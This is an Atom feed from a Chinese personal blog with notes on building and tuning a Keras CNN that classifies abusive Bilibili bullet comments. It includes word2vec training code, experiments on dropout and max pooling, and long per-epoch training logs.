<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[雪地]]></title>
  <link href="http://yinzo.github.io/atom.xml" rel="self"/>
  <link href="http://yinzo.github.io/"/>
  <updated>2017-03-01T17:05:31+08:00</updated>
  <id>http://yinzo.github.io/</id>
  <author>
    <name><![CDATA[]]></name>
    
  </author>
  <generator uri="http://www.mweb.im/">MWeb</generator>
  
  <entry>
    <title type="html"><![CDATA[原始模型优化笔记]]></title>
    <link href="http://yinzo.github.io/14883590547961.html"/>
    <updated>2017-03-01T17:04:14+08:00</updated>
    <id>http://yinzo.github.io/14883590547961.html</id>
    <content type="html"><![CDATA[
<p>对于原始弹幕分类CNN模型进行优化。</p>

<h2 id="toc_0">修改 word2vec model 的 vector size</h2>

<ul>
<li>400:
Nice at epoch 38, validation acc 96.56%</li>
<li>200:
Nice at epoch 37, validation acc 95.22%</li>
<li>100:
Nice at epoch 34, validation acc 94.78%
单轮训练时间与50维相近，测试样例测试耗时 0.92secs</li>
<li>50:
Nice at epoch 40, validation acc 94.39%
单轮训练时间在7秒左右，测试样例(av 8365806)测试耗时 0.7secs</li>
</ul>

<h2 id="toc_1">尝试加入dropout</h2>

<p>在两个 conv 层之间和两个 fc 层之间各加入了一个 \(p=0.5\) 的 dropout</p>

<p>40 epoch 时只有 89.1 acc， 和预想的一样，会导致 达到最佳效果的 epoch 数上升。</p>

<p>用了 dropout 后一个很明显的变化是，原本训练过程中通常是train acc 高于 validation acc，现在通常是 validation acc 高于 train acc，训练后期才基本持平或反超</p>

<p>vector在 epoch 90 左右 达到了96.50%上下的 acc，最终在epoch 300 以上能达到 97.10% 左右的 acc</p>

<p><img src="media/14879250453025/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-24%2022.15.27.png" alt="屏幕快照 2017-02-24 22.15.27"/></p>

<span id="more"></span><!-- more -->

<p>人工检查实际识别效果，仍有少量漏网。果然几个百分点的区别，人简单扫视还是很难看出区别的，而且还要排除安慰剂效应。</p>

<p>实验证明 dropout 确实有效防止了过拟合，并且提高了一定的分类准确度。</p>

<p>接着将几个 word2vec 长度的模型训练图都画出来对比：</p>

<p><img src="media/14879250453025/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-01%2016.57.28.png" alt="屏幕快照 2017-03-01 16.57.28"/></p>

<p>可以从左下角的 tooltip 看到，从上至下分别是词向量长度为 400、200、100、50、25 的模型，在相同迭代次数下的准确度排序。由于选取的是上述模型都仍有收敛空间的迭代数，所以这个排名一定程度上可以代表模型训练所需的迭代次数排序。</p>

<p>由此可以得出结论，词向量维数越多，模型收敛所需的迭代次数越少，但是最终收敛的效果没有变化，这可能是目前训练样本较少的原因。</p>

<p><img src="media/14879250453025/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-01%2017.01.36.png" alt="屏幕快照 2017-03-01 17.01.36"/></p>

<p>切换到训练时间为横轴的图来看，收敛速度实际上是100维最快，这倒是出乎意外，原本以为会是低维模型最快，结果发现，100维由于单次迭代提升更大，虽然迭代速度稍慢但是总体收敛最快。我还特地检查了100维的data graph，确定的确是在用100维的词向量来训练的。</p>

<h3 id="toc_2">关于卷积层是否应该加入 dropout 的问题</h3>

<p>这个问题我找到了 <a href="https://www.reddit.com/r/MachineLearning/comments/42nnpe/why_do_i_never_see_dropout_applied_in/">Reddit 的这个讨论串</a></p>

<h4 id="toc_3">里面提到了以下这些说法：</h4>

<ul>
<li>卷积层的参数数量没有全连接层那么多，所以不那么需要 regularizaion</li>
<li>卷积层 filter map 的梯度是对于整个样本进行平均化的<sup id="fnref1"><a href="#fn1" rel="footnote">1</a></sup>，这样会使得卷积核原本存在相关性的参数，在样本的不同位置使用了不同的 dropout mask，导致 dropout 无效。当然，你可以想办法使卷积核的 dropout mask 在同一层中固定，但是这又会导致 regularizaion 过强。</li>
<li>Srivastava/Hinton 在 dropout 的论文中也有提到：在卷积层加入 dropout 的效果等于没有 \((3.02\% \rightarrow 2.55\%)\)，因为卷积层的参数太少了，不存在过拟合的问题，所以 dropout 几乎没有效果。但是 dropout 在较低的层仍是有用的，它的效果相当于产生一点噪声，使得后面层数较高的全连接层避免过拟合。</li>
<li><p>在卷积层使用 dropout 也不是绝对没有的，以下几篇论文中就有用到：</p>

<ul>
<li><a href="http://arxiv.org/pdf/1511.07289v3.pdf">http://arxiv.org/pdf/1511.07289v3.pdf</a></li>
<li><a href="http://torch.ch/blog/2015/07/30/cifar.html">http://torch.ch/blog/2015/07/30/cifar.html</a></li>
<li><a href="http://danielnouri.org/notes/2014/12/17/using-convolutional-neural-nets-to-detect-facial-keypoints-tutorial/">http://danielnouri.org/notes/2014/12/17/using-convolutional-neural-nets-to-detect-facial-keypoints-tutorial/</a></li>
</ul>

<p>但是他们都有卷积层的 dropout 『keep_prob 较大』的特点。</p></li>
</ul>

<h4 id="toc_4">以下是测试的结果：</h4>

<p>先测试了卷积层不使用 dropout 的效果<br/>
<img src="media/14879250453025/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-27%2013.11.43.png" alt="屏幕快照 2017-02-27 13.11.43"/></p>

<p>绿线是没有 卷积层dropout 的 acc， 紫线是卷积层 p=0.5 dropout 的 acc，两者都有一个 p=0.5 的全连接 dropout。由此可得卷积层的 dropout 还是有效果的，首先防止过拟合的程度要更高，其次对于准确度的提升也是有的 \((\uparrow2.3\%)\)</p>

<p><img src="media/14879250453025/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-03-01%2015.45.56.png" alt="屏幕快照 2017-03-01 15.45.56"/></p>

<p>卷积层 p=0.6 和 p=0.4 dropout 的测试，相比 p=0.5 的模型，收敛速度、收敛精度都没有明显的区别。</p>

<h2 id="toc_5">尝试加入 max_pooling</h2>

<p>先在卷积层和全连接层之间加入一个大小为2的 <code>max_pooling1d</code><br/>
<img src="media/14879250453025/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-26%2016.54.23.png" alt="屏幕快照 2017-02-26 16.54.23"/></p>

<p>可以看到，这个 max_pool 对于最终收敛精度没有影响，在前期略微加快了收敛，但是中期减慢了收敛。</p>

<p>尝试移动该 pooling 层到两个卷积层之间。</p>

<p><img src="media/14879250453025/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-28%2013.42.28.png" alt="屏幕快照 2017-02-28 13.42.28"/></p>

<p>上图为多次测试的结果。收敛速度和收敛准确率没有较为明显的提高或降低 \((96.623\% \rightarrow 96.694\%)\)，只有训练速度有略微的提高。</p>

<p>值得一提的是，加入了 max-pool 的模型在高迭代次数的时候，标准差在逐渐增大。我认为这是因为 max-pool 一定程度上降低了训练样本的精度，相当于训练样本变少了，于是乎少量增加了整个模型在高迭代次数过拟合的风险。这里我选择使用84次迭代的模型，也就是图中横坐标约为 1k 的位置。相对来说过拟合的程度应该是非常小的。</p>

<p><img src="media/14879250453025/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-26%2018.49.29.png" alt="屏幕快照 2017-02-26 18.49.29"/></p>

<div class="footnotes">
<hr/>
<ol>

<li id="fn1">
<blockquote>
<p>the gradients are averaged over the spatial extent of the feature maps&nbsp;<a href="#fnref1" rev="footnote">&#8617;</a></p>
</blockquote>
</li>

</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[低素质弹幕分类器的CNN实现]]></title>
    <link href="http://yinzo.github.io/14863637393852.html"/>
    <updated>2017-02-06T14:48:59+08:00</updated>
    <id>http://yinzo.github.io/14863637393852.html</id>
    <content type="html"><![CDATA[
<h2 id="toc_0">整体架构</h2>

<p>对于一条弹幕，首先进行分词，然后通过 word2vec 转换为词向量，再填充至固定长度，作为卷积神经网络的输入。</p>

<p>卷积神经网络的结构如下：</p>

<pre><code class="language-python">model = Sequential()
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;, input_shape=(100, word_model.vector_size)))
model.add(Activation(&#39;relu&#39;))
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;, input_shape=(100, word_model.vector_size)))
model.add(Activation(&#39;relu&#39;))
model.add(Flatten()) 
model.add(Dense(100, activation=&#39;relu&#39;))
model.add(Dense(2, activation=&#39;softmax&#39;))
model.compile(loss=&#39;categorical_crossentropy&#39;,
              optimizer=&#39;adam&#39;,
              metrics=[&#39;accuracy&#39;]
             )
</code></pre>

<p>最终输出为2位的 categorical result，直接使用第一项，即骂人弹幕的概率作为输出。</p>

<p>然后通过代理，在弹幕服务器与播放器之间插入一层，实现弹幕的分类与屏蔽。最终实现了有效的骂人弹幕自动屏蔽，但是误伤的情况依然存在。</p>

<h2 id="toc_1">搭建过程</h2>

<span id="more"></span><!-- more -->

<p>使用游戏区的所有弹幕来训练 word2vec model。这里我是用的是 word2vec 的 Python 实现 gensim</p>

<p>训练脚本来自这篇文章 <a href="http://www.52nlp.cn/%E4%B8%AD%E8%8B%B1%E6%96%87%E7%BB%B4%E5%9F%BA%E7%99%BE%E7%A7%91%E8%AF%AD%E6%96%99%E4%B8%8A%E7%9A%84word2vec%E5%AE%9E%E9%AA%8C">中英文维基百科语料上的Word2Vec实验</a></p>

<pre><code class="language-python"># -*- coding: utf-8 -*-

&quot;&quot;&quot;
build a word2vec model by text file, each sentence for a line.
usage: [input file] [gensim model filename] [word2vec model filename]
example: output.txt life_damku.model life_damku.vector

&quot;&quot;&quot;

import logging
import os.path
import sys
import multiprocessing

from gensim.models import Word2Vec
from gensim.models.word2vec import LineSentence

if __name__ == &#39;__main__&#39;:
    program = os.path.basename(sys.argv[0])
    logger = logging.getLogger(program)

    logging.basicConfig(format=&#39;%(asctime)s: %(levelname)s: %(message)s&#39;)
    logging.root.setLevel(level=logging.INFO)
    logger.info(&quot;running %s&quot; % &#39; &#39;.join(sys.argv))

    # check and process input arguments
    if len(sys.argv) &lt; 4:
        print(globals()[&#39;__doc__&#39;] % locals())
        sys.exit(1)
    inp, outp1, outp2 = sys.argv[1:4]

    model = Word2Vec(LineSentence(inp), size=400, window=5, min_count=5,
                     workers=multiprocessing.cpu_count())

    # trim unneeded model memory = use(much) less RAM
    # model.init_sims(replace=True)
    model.save(outp1)
    model.save_word2vec_format(outp2, binary=False)

</code></pre>

<p>然后，我从所有弹幕中随机抽取了5000条，进行人工标注分类，其中有63条骂人弹幕。由于骂人弹幕太少，我又通过关键词搜索加人工筛选的方式，增加了4000条骂人弹幕。</p>

<p>以这约9000条弹幕作为训练样本，80%的弹幕作为 train set， 其余的20%作为 validation set</p>

<p>对训练样本进行预处理：</p>

<ol>
<li>分词</li>
<li>转换为词向量</li>
<li>填充至100位长，其中填充的位的词向量全部置零。</li>
</ol>

<p>开始构建卷积神经网络，我选用的框架是使用 TensorFlow 后端的 keras。最终经过调试，得到这样一个结构</p>

<p><a href="https://yinzo.github.io/14863637259966.html">具体的训练过程可以看这里</a></p>

<pre><code class="language-python">model = Sequential()
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;, input_shape=(100, word_model.vector_size)))
model.add(Activation(&#39;relu&#39;))
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;, input_shape=(100, word_model.vector_size)))
model.add(Activation(&#39;relu&#39;))
model.add(Flatten()) 
model.add(Dense(100, activation=&#39;relu&#39;))
model.add(Dense(2, activation=&#39;softmax&#39;))
model.compile(loss=&#39;categorical_crossentropy&#39;,
              optimizer=&#39;adam&#39;,
              metrics=[&#39;accuracy&#39;]
             )
</code></pre>

<p>需要注意的是，<code>model.fit</code> 指定了 class weight</p>

<pre><code class="language-python">model.fit(X_train, Y_train, nb_epoch=1, batch_size=300, class_weight={
              0: len(positive_sample)/len(negative_sample),
              1: 1
          })
</code></pre>

<p>单次训练迭代时间约25秒，我总共迭代了20次。其中每次迭代我都将 model 保存到一个列表中，并使用当前 model 对验证集进行测试，输出测试结果。</p>

<p>然后根据测试结果，选用了第3次迭代的 model ，尝试使用新的，不在样本中的视频弹幕进行人工检验识别效果。</p>

<p>选用视频 <a href="http://www.bilibili.com/video/av8365806/">av8365806</a> 里面存在大量对骂的弹幕，适合进行测试</p>

<p>这里我花了小半天时间，用 tornado 搭了个服务器，模拟 comment.bilibili.com 的所有请求，其中对于弹幕的请求，插入一层封装好的神经网络模型进行分类，再返回给用户请求，其余请求直接转发。搭建好后通过 Surge 的 URL Rewrite 将请求转到本地服务器上。</p>

<p><img src="media/14856271844324/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-06%2013.24.12.png" alt="屏幕快照 2017-02-06 13.24.12"/></p>

<p>然后此时访问弹幕都会先经过本地服务器进行处理了。查看 av8365806 的弹幕分类情况：</p>

<p>首先是比较欣慰的结果，大部分直接用脏字喷人的弹幕都被高确信地识别出来了<br/>
<img src="media/14856271844324/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-06%2013.26.37.png" alt="屏幕快照 2017-02-06 13.26.37"/></p>

<p>其次，存在一些短弹幕被误伤的情况，而且确信度还莫名的挺高<br/>
<img src="media/14856271844324/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-06%2013.26.51.png" alt="屏幕快照 2017-02-06 13.26.51"/></p>

<p>然后，依然存在一部分弹幕脏字不明显，以及一些反讽的语句没有识别出来<br/>
<img src="media/14856271844324/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-02-06%2013.27.39.png" alt="屏幕快照 2017-02-06 13.27.39"/></p>

<p>另外由于3000弹幕的识别时间在5秒左右，再加上网络延迟以及一些预处理后处理的时间，整体延迟约10秒，所以这个代理服务器可能还没能达到投入大规模使用的效率，比较可惜。</p>

<p>但是其识别效果，对于日常观感绝对是有所提升的。</p>

<p>脑海中对于屏蔽模式可以分为以下三挡：</p>

<ol>
<li>【仁慈模式】被分类器识别为骂人的弹幕，弹幕内容前填充100个空格，颜色变为白色，字号变小，统一为滚动弹幕。其中，填充空格能够使得这条弹幕将会以极快的速度飘过视野。</li>
<li>【常规模式】被分类器识别为骂人的弹幕直接删除，该弹幕的发送者的其他弹幕使用仁慈模式进行修正。</li>
<li>【灭杀模式】被分类器识别为骂人的弹幕，以及其发送者发送的其他弹幕，统一删除。</li>
</ol>

<p>原本对于仁慈模式是想进行高透明度处理的，但是由于B站弹幕不支持分开透明度所以就变成了现在的方案。不过由于可以直接修改弹幕类型，不知道高级弹幕是否支持透明度选项，以及高级弹幕在各个平台上的支持度如何。</p>

<h2 id="toc_2">结论</h2>

<p>这次构建卷积神经网络，是学习深度学习方向以来第一次完全自己设计网络结构，并独立完成所有的过程，包括样本收集、样本处理、搭建网络、训练，并且实现了模型的真实可用。作为深度学习的阶段性成果，也是给了我很大的鼓励。这个假期接下来的时间，准备继续学习 RNN 以及 LSTM 等模型，以及其他优化技巧。</p>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[低素质弹幕分类器 CNN 训练笔记]]></title>
    <link href="http://yinzo.github.io/14863637259966.html"/>
    <updated>2017-02-06T14:48:45+08:00</updated>
    <id>http://yinzo.github.io/14863637259966.html</id>
    <content type="html"><![CDATA[
<p>一开始使用这个结构，迭代10次。</p>

<pre><code class="language-python">model = Sequential()
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;, input_shape=(100, word_model.vector_size)))
model.add(Activation(&#39;relu&#39;))
model.add(Convolution1D(5, 4, border_mode=&#39;valid&#39;))
model.add(Activation(&#39;relu&#39;))
model.add(Flatten()) 
model.add(Dense(32, activation=&#39;relu&#39;))
model.add(Dense(2, activation=&#39;softmax&#39;))
model.compile(loss=&#39;categorical_crossentropy&#39;,
              optimizer=&#39;adam&#39;,
              metrics=[&#39;accuracy&#39;]
             )
</code></pre>

<p>完成训练后，乍一看准确率很高，结果 print 出来看一下，低素质弹幕完全没有被过滤，完全是将分类全部丢给 positive 达到的高准确率 (0.98) 的确是 meaningless classification<br/>
并且这个结果在loss里看得很清楚，loss一直是处于15+的</p>

<span id="more"></span><!-- more -->

<p>尝试增加第二个卷积层的节点数，然而训练并没有明显变好</p>

<pre><code class="language-python">model = Sequential()
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;, input_shape=(100, word_model.vector_size)))
model.add(Activation(&#39;relu&#39;))
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;))
model.add(Activation(&#39;relu&#39;))
model.add(Flatten()) 
model.add(Dense(32, activation=&#39;relu&#39;))
model.add(Dense(2, activation=&#39;softmax&#39;))
model.compile(loss=&#39;categorical_crossentropy&#39;,
              optimizer=&#39;adam&#39;,
              metrics=[&#39;accuracy&#39;]
             )
</code></pre>

<p>然后加大了FC层的隐节点，瞬间loss开始猛降，最后降到了0.3左右，print 出来一看，的确效果不错，但是有一部分语句较短的低素质的弹幕没有被识别出来。</p>

<pre><code class="language-python">model = Sequential()
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;, input_shape=(100, word_model.vector_size)))
model.add(Activation(&#39;relu&#39;))
model.add(Convolution1D(100, 4, border_mode=&#39;valid&#39;, input_shape=(100, word_model.vector_size)))
model.add(Activation(&#39;relu&#39;))
model.add(Flatten()) 
model.add(Dense(100, activation=&#39;relu&#39;))
model.add(Dense(2, activation=&#39;softmax&#39;))
model.compile(loss=&#39;categorical_crossentropy&#39;,
              optimizer=&#39;adam&#39;,
              metrics=[&#39;accuracy&#39;]
             )
</code></pre>

<p>然后由于感觉最后一次迭代没有收敛到极致，尝试加大迭代次数看看这个模型的极限如何。</p>

<p>设置迭代100次后。</p>

<pre><code>Epoch 100/100
2999/2999 [==============================] - 9s - loss: 3.7457e-04 - acc: 1.0000
</code></pre>

<p>虽然 acc 和 loss 都到了令人发指的地步，但是发现训练集和测试集忘记shuffle了。。<br/>
但是还是看了一眼测试结果，骂人弹幕的识别率为意料之中的0，因为全都被判定为普通弹幕了。shuffle之后重新训练看看吧，先迭代10次，看看效果，然后再测试100次的过拟合程度</p>

<p>10次的结果是准确率在92.45左右，人工检测的结果还可以，检测出了一部分，但是不够理想，调整的迭代20次看看。</p>

<pre><code>Epoch 20/20
2999/2999 [==============================] - 9s - loss: 0.0689 - acc: 0.9810
</code></pre>

<pre><code>Correct: 1918
Incorrect: 83
Accuracy: 95.852
</code></pre>

<p>人工检测结果有所提升，但是仍然不够理想，提高到50次看看</p>

<pre><code>Epoch 50/50
2999/2999 [==============================] - 9s - loss: 6.4179e-04 - acc: 1.0000
</code></pre>

<pre><code>Correct: 1963
Incorrect: 38
Accuracy: 98.101
</code></pre>

<p>虽然训练数据很好看，但是检查弹幕的识别情况，发现已经过拟合。基本把所有低素质弹幕识别成普通弹幕。</p>

<pre><code>Negative damku accuracy: 7.692
True negative: 2
False negative: 24
</code></pre>

<p>重新回到10次迭代，尝试画出roc曲线</p>

<pre><code>Epoch 10/10
2999/2999 [==============================] - 9s - loss: 0.7608 - acc: 0.8943

Correct: 1886
Incorrect: 115
Overall accuracy: 94.253
Negative damku accuracy: 30.769
True negative: 8
False negative: 18
</code></pre>

<p>然后是20次迭代</p>

<pre><code>Epoch 20/20
2999/2999 [==============================] - 10s - loss: 0.1805 - acc: 0.9710

Correct: 1908
Incorrect: 93
Overall accuracy: 95.352
Negative damku accuracy: 19.231
True negative: 5
False negative: 21
</code></pre>

<p>15次迭代</p>

<pre><code>Epoch 15/15
2999/2999 [==============================] - 9s - loss: 0.3569 - acc: 0.9650

Correct: 1782
Incorrect: 219
Overall accuracy: 89.055
Negative damku accuracy: 46.154
True negative: 12
False negative: 14
</code></pre>

<pre><code>Epoch 17/17
2999/2999 [==============================] - 9s - loss: 0.3631 - acc: 0.9847

Correct: 1893
Incorrect: 108
Overall accuracy: 94.603
Negative damku accuracy: 26.923
True negative: 7
False negative: 19
</code></pre>

<pre><code>2999/2999 [==============================] - 10s - loss: 0.2556 - acc: 0.9760

Correct: 1816
Incorrect: 185
Overall accuracy: 90.755
Negative damku accuracy: 30.769
True negative: 8
False negative: 18
</code></pre>

<p>突然想到训练数据其实不需要遵从概率分布，直接使用上次贝叶斯分类器的弹幕数据即可（上次训练贝叶斯分类器的时候没注意训练样本的概率分布问题，这是个错误）。导入新样本后进行迭代测试</p>

<pre><code>Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.6693 - acc: 0.6699     
Train epoch: 1
Correct: 2912
Incorrect: 692
Overall accuracy: 80.799
Negative damku accuracy: 81.522
True negative: 1328
False negative: 301
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.4421 - acc: 0.8344     
Train epoch: 2
Correct: 3133
Incorrect: 471
Overall accuracy: 86.931
Negative damku accuracy: 82.627
True negative: 1346
False negative: 283
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.2734 - acc: 0.9075     
Train epoch: 3
Correct: 3294
Incorrect: 310
Overall accuracy: 91.398
Negative damku accuracy: 86.618
True negative: 1411
False negative: 218
==========
Epoch 1/1
5405/5405 [==============================] - 20s - loss: 0.1724 - acc: 0.9404     
Train epoch: 4
Correct: 3365
Incorrect: 239
Overall accuracy: 93.368
Negative damku accuracy: 90.117
True negative: 1468
False negative: 161
==========
Epoch 1/1
5405/5405 [==============================] - 22s - loss: 0.1117 - acc: 0.9641     
Train epoch: 5
Correct: 3390
Incorrect: 214
Overall accuracy: 94.062
Negative damku accuracy: 92.879
True negative: 1513
False negative: 116
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0770 - acc: 0.9771     
Train epoch: 6
Correct: 3416
Incorrect: 188
Overall accuracy: 94.784
Negative damku accuracy: 94.598
True negative: 1541
False negative: 88
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0505 - acc: 0.9858     
Train epoch: 7
Correct: 3403
Incorrect: 201
Overall accuracy: 94.423
Negative damku accuracy: 91.590
True negative: 1492
False negative: 137
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0414 - acc: 0.9900     
Train epoch: 8
Correct: 3426
Incorrect: 178
Overall accuracy: 95.061
Negative damku accuracy: 94.905
True negative: 1546
False negative: 83
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0365 - acc: 0.9902     
Train epoch: 9
Correct: 3417
Incorrect: 187
Overall accuracy: 94.811
Negative damku accuracy: 92.756
True negative: 1511
False negative: 118
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0231 - acc: 0.9943     
Train epoch: 10
Correct: 3415
Incorrect: 189
Overall accuracy: 94.756
Negative damku accuracy: 92.449
True negative: 1506
False negative: 123
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0320 - acc: 0.9906     
Train epoch: 11
Correct: 3396
Incorrect: 208
Overall accuracy: 94.229
Negative damku accuracy: 94.905
True negative: 1546
False negative: 83
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0158 - acc: 0.9959     
Train epoch: 12
Correct: 3416
Incorrect: 188
Overall accuracy: 94.784
Negative damku accuracy: 93.738
True negative: 1527
False negative: 102
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0093 - acc: 0.9983     
Train epoch: 13
Correct: 3415
Incorrect: 189
Overall accuracy: 94.756
Negative damku accuracy: 95.212
True negative: 1551
False negative: 78
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0048 - acc: 0.9991     
Train epoch: 14
Correct: 3421
Incorrect: 183
Overall accuracy: 94.922
Negative damku accuracy: 94.843
True negative: 1545
False negative: 84
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0052 - acc: 0.9989     
Train epoch: 15
Correct: 3421
Incorrect: 183
Overall accuracy: 94.922
Negative damku accuracy: 93.923
True negative: 1530
False negative: 99
==========
Epoch 1/1
5405/5405 [==============================] - 20s - loss: 0.0024 - acc: 0.9998         
Train epoch: 16
Correct: 3413
Incorrect: 191
Overall accuracy: 94.700
Negative damku accuracy: 94.291
True negative: 1536
False negative: 93
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0028 - acc: 0.9998     
Train epoch: 17
Correct: 3418
Incorrect: 186
Overall accuracy: 94.839
Negative damku accuracy: 93.186
True negative: 1518
False negative: 111
==========
Epoch 1/1
5405/5405 [==============================] - 21s - loss: 0.0024 - acc: 0.9996         
Train epoch: 18
Correct: 3415
Incorrect: 189
Overall accuracy: 94.756
Negative damku accuracy: 94.352
True negative: 1537
False negative: 92
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0013 - acc: 0.9996         
Train epoch: 19
Correct: 3425
Incorrect: 179
Overall accuracy: 95.033
Negative damku accuracy: 94.475
True negative: 1539
False negative: 90
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 9.6297e-04 - acc: 0.9998     
Train epoch: 20
Correct: 3417
Incorrect: 187
Overall accuracy: 94.811
Negative damku accuracy: 93.493
True negative: 1523
False negative: 106
==========
</code></pre>

<p>想起来一开始 word2vec model 是用的娱乐区弹幕训练的，不完全符合环境。导出游戏区的弹幕重新训练看。</p>

<pre><code>Epoch 1/1
5405/5405 [==============================] - 17s - loss: 0.5780 - acc: 0.7441     
Train epoch: 1
Correct: 3140
Incorrect: 464
Overall accuracy: 87.125
Negative damku accuracy: 89.134
True negative: 1452
False negative: 177
==========
Epoch 1/1
5405/5405 [==============================] - 17s - loss: 0.2168 - acc: 0.9258     
Train epoch: 2
Correct: 3444
Incorrect: 160
Overall accuracy: 95.560
Negative damku accuracy: 93.738
True negative: 1527
False negative: 102
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0978 - acc: 0.9697     
Train epoch: 3
Correct: 3459
Incorrect: 145
Overall accuracy: 95.977
Negative damku accuracy: 95.887
True negative: 1562
False negative: 67
==========
Epoch 1/1
5405/5405 [==============================] - 22s - loss: 0.0606 - acc: 0.9824     
Train epoch: 4
Correct: 3426
Incorrect: 178
Overall accuracy: 95.061
Negative damku accuracy: 96.746
True negative: 1576
False negative: 53
==========
Epoch 1/1
5405/5405 [==============================] - 23s - loss: 0.1076 - acc: 0.9678     
Train epoch: 5
Correct: 3468
Incorrect: 136
Overall accuracy: 96.226
Negative damku accuracy: 94.537
True negative: 1540
False negative: 89
==========
Epoch 1/1
5405/5405 [==============================] - 20s - loss: 0.0476 - acc: 0.9856     
Train epoch: 6
Correct: 3465
Incorrect: 139
Overall accuracy: 96.143
Negative damku accuracy: 95.028
True negative: 1548
False negative: 81
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0285 - acc: 0.9911     
Train epoch: 7
Correct: 3472
Incorrect: 132
Overall accuracy: 96.337
Negative damku accuracy: 95.150
True negative: 1550
False negative: 79
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0192 - acc: 0.9943     
Train epoch: 8
Correct: 3473
Incorrect: 131
Overall accuracy: 96.365
Negative damku accuracy: 96.010
True negative: 1564
False negative: 65
==========
Epoch 1/1
5405/5405 [==============================] - 18s - loss: 0.0128 - acc: 0.9956     
Train epoch: 9
Correct: 3472
Incorrect: 132
Overall accuracy: 96.337
Negative damku accuracy: 95.580
True negative: 1557
False negative: 72
==========
Epoch 1/1
5405/5405 [==============================] - 17s - loss: 0.0079 - acc: 0.9972     
Train epoch: 10
Correct: 3474
Incorrect: 130
Overall accuracy: 96.393
Negative damku accuracy: 95.580
True negative: 1557
False negative: 72
==========
Epoch 1/1
5405/5405 [==============================] - 20s - loss: 0.0060 - acc: 0.9981     
Train epoch: 11
Correct: 3476
Incorrect: 128
Overall accuracy: 96.448
Negative damku accuracy: 95.396
True negative: 1554
False negative: 75
==========
Epoch 1/1
5405/5405 [==============================] - 27s - loss: 0.0045 - acc: 0.9989     
Train epoch: 12
Correct: 3478
Incorrect: 126
Overall accuracy: 96.504
Negative damku accuracy: 95.089
True negative: 1549
False negative: 80
==========
Epoch 1/1
5405/5405 [==============================] - 22s - loss: 0.0031 - acc: 0.9994     
Train epoch: 13
Correct: 3476
Incorrect: 128
Overall accuracy: 96.448
Negative damku accuracy: 95.150
True negative: 1550
False negative: 79
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0024 - acc: 0.9994         
Train epoch: 14
Correct: 3479
Incorrect: 125
Overall accuracy: 96.532
Negative damku accuracy: 95.089
True negative: 1549
False negative: 80
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0020 - acc: 0.9994         
Train epoch: 15
Correct: 3476
Incorrect: 128
Overall accuracy: 96.448
Negative damku accuracy: 94.966
True negative: 1547
False negative: 82
==========
Epoch 1/1
5405/5405 [==============================] - 22s - loss: 0.0018 - acc: 0.9994         
Train epoch: 16
Correct: 3474
Incorrect: 130
Overall accuracy: 96.393
Negative damku accuracy: 95.150
True negative: 1550
False negative: 79
==========
Epoch 1/1
5405/5405 [==============================] - 19s - loss: 0.0016 - acc: 0.9994         
Train epoch: 17
Correct: 3475
Incorrect: 129
Overall accuracy: 96.421
Negative damku accuracy: 95.457
True negative: 1555
False negative: 74
==========
Epoch 1/1
5405/5405 [==============================] - 21s - loss: 0.0014 - acc: 0.9994         
Train epoch: 18
Correct: 3474
Incorrect: 130
Overall accuracy: 96.393
Negative damku accuracy: 95.150
True negative: 1550
False negative: 79
==========
Epoch 1/1
5405/5405 [==============================] - 24s - loss: 0.0013 - acc: 0.9996     
Train epoch: 19
Correct: 3474
Incorrect: 130
Overall accuracy: 96.393
Negative damku accuracy: 95.089
True negative: 1549
False negative: 80
==========
Epoch 1/1
5405/5405 [==============================] - 21s - loss: 0.0037 - acc: 0.9991         
Train epoch: 20
Correct: 3469
Incorrect: 135
Overall accuracy: 96.254
Negative damku accuracy: 96.624
True negative: 1574
False negative: 55
==========

</code></pre>

<p>效果提升明显</p>

